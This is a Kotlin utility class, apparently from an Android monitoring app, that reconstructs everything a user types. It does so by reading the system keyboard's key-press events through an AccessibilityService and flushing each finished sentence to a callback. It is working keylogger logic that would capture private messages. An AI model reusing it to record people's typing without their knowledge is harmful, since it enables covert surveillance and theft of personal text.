package com.pes.gamingdetector.util

/**
 * Reconstructs typed sentences from per-key AccessibilityService click events
 * fired by the OS keyboard (Gboard, Samsung Honeyboard, SwiftKey, AOSP keyboard).
 *
 * The keyboard is itself an Android app, so each tap on a key generates a
 * TYPE_VIEW_CLICKED event with the key's contentDescription ("q", "space",
 * "delete", "shift", a whole suggested word, etc.). Feeding those labels into
 * this buffer assembles them back into a sentence, which is then flushed:
 *
 *  - on an explicit send / enter / return key
 *  - on a non-keyboard click (user tapped away from the keyboard)
 *  - after a configurable idle timeout (default 2.5 s)
 *
 * Designed to be called from the main accessibility callback thread. No locking.
 */
class KeystrokeBuffer(
    private val flushIdleMs: Long = 2_500L,
    private val onFlush: (String) -> Unit
) {
    private val sb = StringBuilder()
    private var shiftActive = false
    private var lastActivityMs = 0L

    fun handleKey(rawLabel: String?) {
        val label = rawLabel?.trim().orEmpty()
        if (label.isEmpty()) return
        lastActivityMs = System.currentTimeMillis()

        when {
            isEnter(label)     -> flush()
            isBackspace(label) -> { if (sb.isNotEmpty()) sb.deleteCharAt(sb.length - 1) }
            isSpace(label)     -> sb.append(' ')
            isShift(label)     -> shiftActive = !shiftActive
            label.length == 1  -> {
                val ch = if (shiftActive) label.uppercase() else label.lowercase()
                sb.append(ch)
                shiftActive = false  // one-shot shift
            }
            // Suggestion-bar tap (whole word, possibly capitalised) or a long
            // multi-char label. Accept short word-like strings only — skip
            // labels like "Switch input method" or "Voice typing".
            looksLikeWord(label) -> {
                if (sb.isNotEmpty() && !sb.endsWith(' ')) sb.append(' ')
                sb.append(label).append(' ')
            }
            // Anything else (emoji panel toggle, language switch, settings…) → ignore
        }
    }

    /** Flush whatever is buffered, if it looks like a real sentence. */
    fun flush() {
        val text = sb.toString().trim()
        sb.clear()
        shiftActive = false
        if (text.length >= 3) onFlush(text)
    }

    /** Call periodically. Returns true if it actually flushed. */
    fun flushIfIdle(): Boolean {
        if (sb.isEmpty()) return false
        if (System.currentTimeMillis() - lastActivityMs < flushIdleMs) return false
        flush()
        return true
    }

    fun clear() {
        sb.clear()
        shiftActive = false
    }

    // ── label classifiers ────────────────────────────────────────────────

    private fun isEnter(s: String): Boolean {
        val l = s.lowercase()
        return l == "enter" || l == "return" || l == "send" || l == "done" ||
                l == "go" || l == "search" ||
                l.contains("send", ignoreCase = false) ||
                l.contains("enter", ignoreCase = false)
    }

    private fun isBackspace(s: String): Boolean {
        val l = s.lowercase()
        return l == "delete" || l == "backspace" || l == "del" ||
                l.contains("delete") || l.contains("backspace")
    }

    private fun isSpace(s: String): Boolean {
        val l = s.lowercase()
        return l == " " || l == "space" || l == "spacebar"
    }

    private fun isShift(s: String): Boolean {
        val l = s.lowercase()
        return l == "shift" || l == "capslock" || l == "caps lock"
    }

    private fun looksLikeWord(s: String): Boolean {
        if (s.length !in 2..40) return false
        // Allow letters, digits, apostrophe, hyphen — typical of suggestion-bar words.
        return s.all { it.isLetterOrDigit() || it == '\'' || it == '-' }
    }
}
